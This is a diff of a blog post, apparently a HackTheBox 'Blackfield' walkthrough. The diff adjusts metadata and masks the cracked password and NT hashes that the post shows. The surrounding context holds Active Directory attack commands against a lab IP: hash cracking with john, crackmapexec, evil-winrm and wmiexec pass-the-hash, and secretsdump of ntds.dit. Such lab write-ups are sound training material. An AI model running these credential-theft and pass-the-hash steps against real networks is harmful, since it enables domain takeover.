@@ -1,10 +1,10 @@
 ---
 title: "Blackfield - HackTheBox Walkthrough"
-date: 2026-01-10 15:30:00 +1100
+date: 2026-01-09 15:30:00 +1100
 categories: [TryHackMe, HTB]
 tags: [penetration-testing, active-directory, asreproasting, bloodhound, lsass, sebackupprivilege, windows]
 image:
-  path: /assets/img/posts/blackfield-header.jpg
+  path: /assets/img/blackfield-header.jpg
   alt: Blackfield HTB Machine
 ---
 
@@ -83,7 +83,7 @@ Saved this to a file called `hash.txt` and cracked it with John:
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-**Password found**: `#00^BlackKnight`
+**Password found**: `xxxxBlackKnight`
 
 ---
 
@@ -165,7 +165,7 @@ crackmapexec smb 10.129.229.17 -u users.txt -H hashes.txt
 
 Found working credentials:
 - **Username**: svc_backup
-- **Hash**: 9658d1d1dcd9250115e2205d9f48400d
+- **Hash**: 965xd1x1dcd9x501x5e2x05dxf48x00d
 
 ---
 
@@ -174,7 +174,7 @@ Found working credentials:
 Connected using evil-winrm with the hash:
 
 ```bash
-evil-winrm -i 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+evil-winrm -i 10.129.229.17 -u svc_backup -H 965xd1dxdcdx250x15ex205x9f48400d
 ```
 
 Checked my privileges:
@@ -284,7 +284,7 @@ sudo impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
 Found the Administrator hash:
 
 ```
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+Administrator:500:aax3b4x5b5x404xeaax3b43xb51x04ex:18xfb5x517x480xe64x24d4cd53b99ee:::
 ```
 
 ---
@@ -294,7 +294,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b9
 Used wmiexec to get an Administrator shell:
 
 ```bash
-impacket-wmiexec -hashes :184fb5e5178480be64824d4cd53b99ee administrator@10.129.229.17
+impacket-wmiexec -hashes :1x4fbxe51x848xbe6x824x4cdx3b99ee administrator@10.129.229.17
 ```
 
 Grabbed the flag:
